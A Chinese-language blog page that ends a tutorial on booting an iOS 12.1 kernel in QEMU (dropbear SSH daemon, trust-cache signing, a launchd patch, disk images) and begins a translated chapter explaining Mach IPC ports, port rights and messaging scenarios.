class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">integer</span>&gt;</span>0<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>UserName<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>root<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/mkj/dropbear"><strong>dropbear</strong></a> - 将用作 SSH 服务器。</p>
<p>创建<code>plist</code>文件并将其另存为<code>/Volumes/PeaceB16B92.arm64UpdateRamDisk/System/Library/LaunchDaemons/dropbear.plist</code>。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">plist</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//Apple//DTD PLIST 1.0//EN&quot;</span> <span class="string">&quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>CFBundleIdentifier<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>com.apple.dropbear<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>EnablePressuredExit<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">false</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>EnableTransactions<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">false</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>HighPriorityIO<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>KeepAlive<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>Label<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>Dropbear<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>POSIXSpawnType<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>Interactive<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>ProgramArguments<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>/iosbinpack64/usr/local/bin/dropbear<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>--shell<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>/iosbinpack64/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>-R<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>-E<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>-F<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>RunAtLoad<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>Umask<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">integer</span>&gt;</span>0<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>UserName<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>root<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>现在需要确保系统中的所有二进制文件都根据它们在<code>ProgramArguments</code>描述的那样，在对应的位置上。</p>
<ul>
<li><code>/iosbinpack64/bin/bash</code>- <em>iosbinpack64 的一部分</em></li>
<li><code>/sbin/mount</code>- <em>iOS系统的一部分</em></li>
<li><code>/bin/tunnel</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> xnu-qemu-arm64-tools/tcp-tunnel</span><br><span class="line"><span class="built_in">export</span> IOS_DIR=./iPhone_5.5_12.1_16B92_Restore</span><br><span class="line">make</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> bin/tunnel /Volumes/PeaceB16B92.arm64UpdateRamDisk/bin/tunnel</span><br><span class="line"><span class="built_in">cd</span> -</span><br></pre></td></tr></table></figure>

<ul>
<li><code>/iosbinpack64/usr/local/bin/dropbear</code>- <em>iosbinpack64 的一部分</em></li>
</ul>
<h3 id="5-关于静态信任缓存的注意事项"><a href="#5-关于静态信任缓存的注意事项" class="headerlink" title="5. 关于静态信任缓存的注意事项"></a>5. 关于静态信任缓存的注意事项</h3><p>由于要运行的是一个未打补丁的内核，要在不修补内核的情况下运行未经 Apple 签名的二进制文件，必须创建一个静态 Trust Cache 文件。静态信任缓存是系统信任的签名列表，并允许执行使用这些签名签名的二进制文件。</p>
<p>签名 <strong><code>/bin/tunnel</code></strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> jtool --sign --ent ent.xml --inplace /Volumes/PeaceB16B92.arm64UpdateRamDisk/bin/tunnel</span><br></pre></td></tr></table></figure>

<p>签名文件</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">plist</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//Apple//DTD PLIST 1.0//EN&quot;</span> <span class="string">&quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>platform-application<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.private.security.container-required<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">false</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>一般变化</strong></p>
<p><em>替换</em> <code>fstab</code> <em>文件</em></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> /Volumes/PeaceB16B92.arm64UpdateRamDisk/etc/fstab /Volumes/PeaceB16B92.arm64UpdateRamDisk/etc/fstab_orig</span><br><span class="line"><span class="built_in">sudo</span> vim /Volumes/PeaceB16B92.arm64UpdateRamDisk/etc/fstab</span><br></pre></td></tr></table></figure>

<p>从文件中删除内容并复制以下内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/dev/disk0 / hfs ro 0 1</span><br><span class="line">/dev/disk1 /private/var hfs rw,nosuid,nodev 0 2</span><br></pre></td></tr></table></figure>

<p><em>防止</em> <code>keybagd</code> <em>守护程序在系统启动时运行</em></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> /Volumes/PeaceB16B92.arm64UpdateRamDisk/System/Library/LaunchDaemons/com.apple.mobile.keybagd.plist</span><br></pre></td></tr></table></figure>

<h3 id="6-修补已启动的二进制文件"><a href="#6-修补已启动的二进制文件" class="headerlink" title="6. 修补已启动的二进制文件"></a>6. 修补已启动的二进制文件</h3><p>为了<code>launchd</code>加载我们之前添加的程序，需要对二进制文件<code>xpcd_cache.dylib</code>打补丁。</p>
<p>将二进制文件<code>/Volumes/PeaceB16B92.arm64UpdateRamDisk/sbin/launchd</code>倒入Ghidra并分析它。将<code>0x10002fb18</code>处的指令 <code>cset w20,ne</code>改为<code>mov w20,#0x01</code>。保存修改后的二进制文件，替换原始文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">mv</span> /Volumes/PeaceB16B92.arm64UpdateRamDisk/sbin/launchd /Volumes/PeaceB16B92.arm64UpdateRamDisk/sbin/launchd.orig</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> launchd.bin /Volumes/PeaceB16B92.arm64UpdateRamDisk/sbin/launchd</span><br></pre></td></tr></table></figure>

<p>使用 jtool 对二进制文件进行签名，从原始文件中获取权利<code>launchd</code>（之前的 ent.xml 也可以使用）。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> jtool --sign --ent ent.xml --ident com.apple.xpc.launchd --inplace /Volumes/PeaceB16B92.arm64UpdateRamDisk/sbin/launchd</span><br></pre></td></tr></table></figure>

<p>弹出磁盘。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hdiutil detach /Volumes/PeaceB16B92.arm64UpdateRamDisk</span><br><span class="line">hdiutil detach /Volumes/PeaceB16B92.N56N66OS</span><br></pre></td></tr></table></figure>

<h3 id="7-创建辅助磁盘设备"><a href="#7-创建辅助磁盘设备" class="headerlink" title="7. 创建辅助磁盘设备"></a>7. 创建辅助磁盘设备</h3><p>与主磁盘一样，我们也可以使用 ramdisk 结构。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> iPhone_5.5_12.1_16B92_Restore/048-32651-104.dmg.out ./hfs.sec</span><br><span class="line">hdiutil resize -size 6G -imagekey diskimage-class=CRawDiskImage ./hfs.sec</span><br><span class="line">hdiutil attach -imagekey diskimage-class=CRawDiskImage ./hfs.sec</span><br><span class="line">hdiutil attach iPhone_5.5_12.1_16B92_Restore/048-31952-103.dmg</span><br></pre></td></tr></table></figure>

<p>删除 ramdisk 的所有内容并将 ramdisk 与<code>/private/var</code>主磁盘映像中的目录同步。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -rf /Volumes/PeaceB16B92.arm64UpdateRamDisk/*</span><br><span class="line"><span class="built_in">sudo</span> rsync -av /Volumes/PeaceB16B92.N56N66OS/private/var/* /Volumes/PeaceB16B92.arm64UpdateRamDisk/</span><br></pre></td></tr></table></figure>

<p>为 dropbear 创建一个目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> /Volumes/PeaceB16B92.arm64UpdateRamDisk/dropbear</span><br></pre></td></tr></table></figure>

<p>弹出磁盘</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hdiutil detach /Volumes/PeaceB16B92.arm64UpdateRamDisk</span><br><span class="line">hdiutil detach /Volumes/PeaceB16B92.N56N66OS</span><br></pre></td></tr></table></figure>

<h2 id="第六步，QEMU"><a href="#第六步，QEMU" class="headerlink" title="第六步，QEMU"></a>第六步，QEMU</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> xnu-qemu-arm64</span><br><span class="line">./configure --target-list=aarch64-softmmu --disable-capstone --disable-pie --disable-slirp</span><br><span class="line">make -j8</span><br><span class="line"><span class="built_in">cd</span> -</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xnu-qemu-arm64/aarch64-softmmu/qemu-system-aarch64 -M iPhone6splus-n66-s8000,kernel-filename=iPhone_5.5_12.1_16B92_Restore/kernelcache.release.n66.out,dtb-filename=iPhone_5.5_12.1_16B92_Restore/Firmware/all_flash/DeviceTree.n66ap.im4p.out,driver-filename=xnu-qemu-arm64-tools/aleph_bdev_drv/bin/aleph_bdev_drv.bin,qc-file-0-filename=hfs.main,qc-file-1-filename=hfs.sec,kern-cmd-args=<span class="string">&quot;debug=0x8 kextlog=0xfff cpus=1 rd=disk0 serial=2&quot;</span>,xnu-ramfb=off -cpu max -m 6G -serial mon:stdio</span><br></pre></td></tr></table></figure>

<p>一切正常的话，ssh应该已经启动了，这时只需要通过ssh连接本地2222端口即可，密码是<code>alpine</code>。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>正常使用bash命令需要设置环境变量：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/iosbinpack64/usr/bin:/iosbinpack64/bin:/iosbinpack64/usr/sbin:/iosbinpack64/sbin</span><br></pre></td></tr></table></figure>

<p><em>为了简化工作流程，值得将二进制文件从<code>iosbinpack64/bin</code>,<code>iosbinpack64/usr/bin</code>等符号链接到相应<code>/bin</code>的 ,<code>/usr/bin</code>等目录中。</em></p>
<p>需要自己解决一下scp的问题，因为，每次启动qemu，环境变量是没有的，scp肯定是不行，这里就是直接复制到<code>/usr/bin/</code>目录下。</p>
<p>⚠️因为没有优雅的关闭系统，所以<code>hfs.sec</code>是挂载到 iOS 上的，关闭QEMU后，再次挂载会失败。因此，当系统重新启动时，需要在 mac 上挂载和卸载磁盘。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hdiutil attach -imagekey diskimage-class=CRawDiskImage hfs.sec</span><br><span class="line">hdiutil detach /Volumes/PeaceB16B92.arm64UpdateRamDisk</span><br></pre></td></tr></table></figure>

<p>如果想要进行调试，需要在QEMU的命令行中添加<code>-S -s</code>，具体可以参考<a target="_blank" rel="noopener" href="https://worthdoingbadly.com/xnuqemu2/">这里</a>。</p>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://github.com/alephsecurity/xnu-qemu-arm64/wiki/Build-iOS-on-QEMU">Build iOS on QEMU</a></p>
<p><a target="_blank" rel="noopener" href="https://worthdoingbadly.com/xnuqemu/">Almost booting an iOS kernel in QEMU</a></p>
<p><a target="_blank" rel="noopener" href="https://alephsecurity.com/2019/06/17/xnu-qemu-arm64-1/">Running iOS in QEMU to an interactive bash shell (1)</a></p>
<p><a target="_blank" rel="noopener" href="https://alephsecurity.com/2020/03/29/xnu-qemu-tcp-tunnel/">Tunnelling TCP connections into iOS on QEMU</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-08-23T00:36:43.000Z" title="2021/8/23 08:36:43">2021-08-23</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-03-27T09:20:14.894Z" title="2022/3/27 17:20:14">2022-03-27</time></span><span class="level-item">32 minutes read (About 4777 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/08/23/11%20The%20Message%20is%20the%20Medium-Mach%20IPC(the%20user%20mode%20view)/">The Message is the Medium-Mach IPC(the user mode view)</a></p><div class="content"><h1 id="本章概览"><a href="#本章概览" class="headerlink" title="本章概览"></a>本章概览</h1><ul>
<li>A little history</li>
<li>Ma-xioms</li>
<li>Scenarios</li>
<li>Mach Port APIs</li>
<li>Message format</li>
<li>Sending and receiving message</li>
<li>The Mach Interface Generator</li>
</ul>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>XNU有两个特性：一是，POSIX&#x2F;BSD，以及增加的syscall和功能，它是Mach的隐藏特性，但是，它驱动着大量的内核功能，包括下层的BSD层。其主要责任是传递信息。Mach IPC是有史以来开发的最快的IPC机制之一，也是三巨头中最快的。尽管XNU也支持经典的UNIX socket模型，在不考虑便携性的情况下，Mach被广泛地使用。</p>
<p>尽管它们十分重要，但Mach消息API通常被Apple轻视，Apple更愿意去提升高层次的框架wrapper以及最近的XPC。但是低层次上，是Mach消息通过Mach port传递消息。本章的主要目的是对这个奇幻的世界进行概述，而且这个世界从其他角度来看，是Darwin操作系统的一个独立方面。</p>
<p>本章先从介绍消息机制中十分基础的对象开始：端点(endpoint)或端口(port)。它提出了一套简单的设计选择，这些选择必须被接受为公理原则，信息传递将在此基础上进行。因此，出于这些公理原因，消息机制提出了三种常见的方式，以支持对等实体之间的通信建立。这些方式展示了一些端口提供的API，完整的集合在稍后给出。</p>
<p>在解释清楚端口定义之后，本章将聚焦于消息本身 - 介绍消息结构体和它在用户模式下的处理函数。主要聚焦于Mach接口生成器(Mach Interface Generator, MIG)，即处理器允许消息的快速代码生成。MIG有一个令人愉悦的简单接口，其隐藏了大量的不那么令人愉悦的代码。由于这段代码的本质和普遍性，我们将特别关注怎么理解整段代码 - 以及它在逆向时的产物。</p>
<blockquote>
<p>本章主要关注用户模式下的情况，其中Mach消息仅仅是能工作。这样能避免接触底层内核的实现方式，因为这需要了解错综复杂的内核结构 - 最好是放在Volume II 中进行解释。</p>
</blockquote>
<h2 id="A-little-history"><a href="#A-little-history" class="headerlink" title="A little history"></a>A little history</h2><p>XNU的基础是NeXTSTEP[1]，并且NeXTSTEP基于Mach。Mach微内核在其加入开源软件基金会之前，是Carnegie Mellon大学的一个研究小组在1985年至1994年之间开发的。Mach项目主页至今仍然在线，仍然保持着古老的WWW网页风格。Mach首次提出是在Usenix上。它一直处于学术范围内，并且，它的文档或者编程环境是十分受限的。Mach3内核准则文档是唯一存在的文档，另一本是绝版书。Carnegie Mellon还保留着一份已出版和未出版的Mach论文清单，提供了关于设计的深刻见解。</p>
<blockquote>
<p>[1]NeXTSTEP是由乔布斯在1985年离开苹果后创建的公司，系统基于Mach和BSD。</p>
</blockquote>
<p>作为一个微内核，Mach不得不依赖于消息传递机制。在微内核设计中，组件分散在不同的隔离的地址空间中，所以发送与接收消息是它们之间协作完成工作的唯一办法。Mach-er们开发了一个优雅的消息传递机制，主要强调效率和总体上的速度。在消息传递机制中，微内核主要负责接收消息 - 即一小块内存 - 从一个task，然后执行必需的操作将这块内存移动(共享)到另一个task。</p>
<p>NeXTSTEP严格的遵循了微内核的设计理念，但是仅有微内核不能构成一个系统。FreeBSD 4.3被作为一个高层吸纳进来，提供了类似UNIX&#x2F;POSIX中的进程、线程、信号、文件和套接字。但是在底层，Mach的API保持着可访问性，并允许在内核中单独分离出来，这就是后来的XNU。自此之后，由于XNU的逐步发展，更多的注意力被放在了它的BSD API上，但是Mach始终保持着驱动力。尽管大多数开发者都使用它的API(Apple更喜欢)，但他们的应用程序依然十分依赖于Mach，因为Apple自己的框架和库也是这么做的。</p>
<p>像它设计的效率性一样，这种方式不得不作出一些让步，到目前为止(在Chapter 2中所述的那样)，XNU是一个庞大的内核。但是，如果简单地将它与Linux和Windows庞大的内核归为一类 - 就好比是将苹果与橙子进行比较。在XNU的深处，消息的发送与接收 - 仅依赖于线程，而不是相分离的进程。</p>
<p>Mach依然像30年前那样前卫。Mach消息机制依然是有史以来开发的最快的IPC机制之一。它可以轻易的在用户模式进程、用户和内核、或者在内核中使用。很容易地认为Mach消息机制和其他IPC机制类似，如Linux的domain socket，或者Android的Binder。然而，这样想可能会导致误解。<strong>Mach的IPC设计是基于单向通信的，而不是双向的</strong>。不难思考的是，后者可以由前者模拟出来(通过建立两个单独的通道，一个用于发送，一个用于接收)。然而，这样做的过程比其他机制要复杂得多，并且需要无条件的接受其设计决策。即使如此，随着时间的流逝，决策背后的逻辑开始变得清晰(就像它的一些原始假设一样)。</p>
<blockquote>
<p>如果你是新入门Mach，本文所提出的概念即使不是很奇怪，但也不直观。我们试图去寻找其与UNIX IPC的相识之初 - 但是这两种机制是完全不同的。这需要在阅读的时候要谨慎，并且可能需要对于概念”sink in”进行重新阅读理解。</p>
</blockquote>
<h2 id="Mach-axioms"><a href="#Mach-axioms" class="headerlink" title="Mach-axioms"></a>Mach-axioms</h2><p>Mach消息机制能通过简单的场景进行演示，以观察两个对等实体之间通信所需的步骤。在我们开始之前，我们需要先了解一些创建Mach的设计决策。由于它们深植于Mach架构中(并且，Darwin也是如此)，所以更简单的接受它们的方式是，给出一些公理。</p>
<ul>
<li><p><strong>公理1: Mach允许通过port进行IPC:</strong> Mach IPC最基本的元素是<strong>端口</strong>。端口为IPC提供了一个端点。消息可以被发送给一个端口，或者从端口处进行接收。端口可以轻易的被用户空间和内核空间的任何人创建或销毁。如果这是Mach 端口的唯一细节，则读者可能会认为它只是另一个消息队列的实现，而不予理会，比如Windows或System V的msgsend和friend。但是它远不止这些，这将为我们引出下一条公理。</p>
</li>
<li><p><strong>公理2: 端口只能被端口权限访问:</strong> 端口的用户永远看不到端口本身，但是可以通过一种叫<strong>端口权限</strong>的东西间接进行访问。以下是一些已有的端口权限类型，这里介绍几个基础的：</p>
<ul>
<li><strong>SEND权限:</strong> 允许持有者向底层端口发送消息，但是不从它们那里接收消息。这是一个<strong>只写</strong>能力。它可能被任意数量的线程或task中的持有者所持有。它同样是及物的，因此可以被<strong>拷贝任意次</strong>(通过COPY_SEND)，并传递给其他持有者。</li>
<li><strong>SEND_ONCE:</strong> 和SEND类似，它拥有相同的能力 - 发送但不接收。不同的是，<strong>这个权限只能使用一次</strong> - 使用完后会立即被内核取消 - 想要再次向底层端口发送消息是不可能的(除非它获取到了其他权限)。同时，它<strong>不能被复制，但是可以被移动</strong>。和SEND类似，任意数量的持有者都可以拥有一项SEND_ONCE权限。</li>
<li><strong>RECEIVE:</strong> 允许它的持有者读取被发送到端口的任意消息。它在内部将它的持有者标记为端口的owner - 可以创建任意其他想要的权限。不像其他权限 - 一个端口仅有一个RECEIVE权限，并且端口仅存在于权限拥有者存活时。如果拥有者结束了(或取消分配端口)，所有SEND[ONCE]权限将变成DEAD_NAME。</li>
</ul>
<p>总结端口权限定义，我们给出以下的表格：</p>
<p>表 11- 1: Mach端口权限总结</p>
<table>
<thead>
<tr>
<th>权限</th>
<th>数量</th>
<th>及物</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>SEND</td>
<td>0+</td>
<td>MOVE，COPY</td>
<td>可以向端口发送任意数量的消息</td>
</tr>
<tr>
<td>SEND_ONCE</td>
<td>0+</td>
<td>仅MOVE</td>
<td>仅能向端口发送一次消息</td>
</tr>
<tr>
<td>DEAD_NAME</td>
<td>0+</td>
<td>—</td>
<td>SEND_ONCE使用后，或者SEND的接受者died&#x2F;deallocated</td>
</tr>
<tr>
<td>RECEIVE</td>
<td>1</td>
<td>仅MOVE</td>
<td>可以从端口接收消息，或者向端口插入其他权限</td>
</tr>
</tbody></table>
<p>因此，端口权限提供了几乎与其他IPC机制相同的能力 - 但是有一个主要的区别：权限和单向，然而大多数IPC机制是双向的。</p>
</li>
<li><p><strong>公理3: 端口权限可以通过消息进行传递:</strong> 当发送一个消息时，Mach允许发送者在消息中包含0+个端口权限，这是被消息接受者所授予的。这与UNIX的domain socket传递文件描述符的能力相似。</p>
</li>
</ul>
<h2 id="Mach-messaging-scenarios"><a href="#Mach-messaging-scenarios" class="headerlink" title="Mach messaging scenarios"></a>Mach messaging scenarios</h2><p>和几何学与其他科学类似，我们一旦接受了公理，就可以依据它建立更高层次、详细的结构。因此，同样的是Mach的案例。接下来，我们转向去考虑经典的A(lice)和B(ob)场景，将尝试在这两个对等实体之间建立通信。</p>
<h3 id="Scenario-1-Alice-and-Bob"><a href="#Scenario-1-Alice-and-Bob" class="headerlink" title="Scenario 1: Alice and Bob"></a>Scenario 1: Alice and Bob</h3><p>假设，在这一时刻，Alice先验地知道Bob的情况。用Mach的说法，Alice拥有一个端口的发送权限，这个端口的接收权限是被Bob所有。如果我们将这些作为前提条件，接下来的交互将使Alice和Bob之间建立双向通信：</p>
<ol>
<li>Alice创建一个短暂的端口，即一个她拥有接收权限的端口。她通过调用mach_port_allocate()函数实现。(公理 1)</li>
<li>作为新创建端口的所有者，Alice可以创建任意她想要的其他权限。因此，她接下来为端口创建一个SEND权限，通过mach_port_insert_right()函数实现。(公理 2)</li>
<li>Alice现在同时拥有了她新创建的端口的接收和发送权限。这对她有什么好处呢？不多，她可以单方面的发送和接收消息 - 给她自己。这几乎没什么用。但是，回忆一下，端口权限可通过消息进行传递。Alice紧接着创建一个消息给Bob，在消息中放入她的端口的发送权限，然后投递给Bob - 鉴于先验持有对Bob的发送权，我们假定她有。(假设+公理 3)</li>
<li>Bob通过拥有接收权限的端口收到Alice的消息。依据公理3，Bob拥有了Alice端口的SEND权限。现在双方可以进行双向通信。他们可以使用任一已有的端口权限 -  尽管两者都能进一步创建一个短暂的端口(通过Alice所使用的方式)，并赋予其他人发送权限 - 因此建立了另一条单向通信通道(并且，结果是，双向通道)。</li>
</ol>
<p>这个场景可能看上去不是很有效率(尤其是和UNIX的socket进行对比)，但是毫无疑问的是，它得到了自己想要的结果 - Alice和Bob能够自由地进行通信。事实上，不像socket，Alice享有socket不能提供的巨大的好处，即：</p>
<ul>
<li>Alice可能对和Bob之间的持续通信不感兴趣。她可能只需要Bob的一次性帮助，仅此而已。在这种情况下，Alice可以通过检查进程，将SEND权限替换为SEND_ONCE权限即可。<em>Bob仍然可以根据Alice的这个权限进行回复 - 一旦他回复了，他和Alice的连接就将终止。</em>不像socket，Bob不知道Alice的位置在哪，也没有任何形式的地址可以找到她。</li>
<li>Alice可能甚至不想给Bob一个回复的机会。当然，对等实体可以重置连接。但是其他人可以持续进行连接访问，以及重新初始化连接 - 这将导致从小问题变成完全的DoS攻击。Mach的SEND_ONCE权限提供了socket难以模拟的独特的功能。更进一步来说，发送消息但没有回复地址(实际上，是一个匿名消息)的能力是根本不存在的。</li>
</ul>
<hr>
